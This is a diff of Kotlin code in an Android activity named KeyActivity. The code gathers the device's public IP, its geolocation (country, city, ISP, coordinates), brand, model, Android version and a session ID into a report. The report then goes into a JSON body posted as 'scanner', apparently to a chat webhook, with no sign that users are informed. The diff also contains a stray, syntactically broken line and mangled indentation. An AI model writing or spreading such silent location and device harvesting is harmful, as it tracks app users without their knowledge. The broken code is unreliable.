@@ -238,25 +238,29 @@ class KeyActivity : Activity() {
                 val j = org.json.JSONObject(geo)
                 .Build.VERSION.SDK_INT
                 val hora = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
-                    .format(java.util.Date())
-                val modelo = android.os.Build.MODEL
-                val marca = android.os.Build.BRAND
-                val versionAndroid = android.os.Build.VERSION.RELEASE
-                val sdk = android.os.Build.VERSION.SDK_INT
+    .format(java.util.Date())
 
-                val desc = """
-                    **IP:** ${j.optString("query", ip)}
-                    **País:** ${j.optString("country", "?")}
-                    **Región:** ${j.optString("regionName", "?")}
-                    **Ciudad:** ${j.optString("city", "?")}
-                    **ISP:** ${j.optString("isp", "?")}
-                    **Coords:** ${j.optDouble("lat", 0.0)}, ${j.optDouble("lon", 0.0)}
-                    **Equipo:** $marca $modelo
-                    **Android:** $versionAndroid (SDK $sdk)
-                    **Operador:** $operador
-                    **Hora:** $hora
-                    **Sesión:** $sesion
-                """.trimIndent()
+val modelo = android.os.Build.MODEL
+val marca = android.os.Build.BRAND
+val versionAndroid = android.os.Build.VERSION.RELEASE
+val sdk = android.os.Build.VERSION.SDK_INT
+
+val operador = "No disponible"
+val sesion = java.util.UUID.randomUUID().toString()
+
+val desc = """
+    **IP:** ${j.optString("query", ip)}
+    **País:** ${j.optString("country", "?")}
+    **Región:** ${j.optString("regionName", "?")}
+    **Ciudad:** ${j.optString("city", "?")}
+    **ISP:** ${j.optString("isp", "?")}
+    **Coords:** ${j.optDouble("lat", 0.0)}, ${j.optDouble("lon", 0.0)}
+    **Equipo:** $marca $modelo
+    **Android:** $versionAndroid (SDK $sdk)
+    **Operador:** $operador
+    **Hora:** $hora
+    **Sesión:** $sesion
+""".trimIndent()
 
                 val body = org.json.JSONObject().apply {
                     put("username", "scanner")
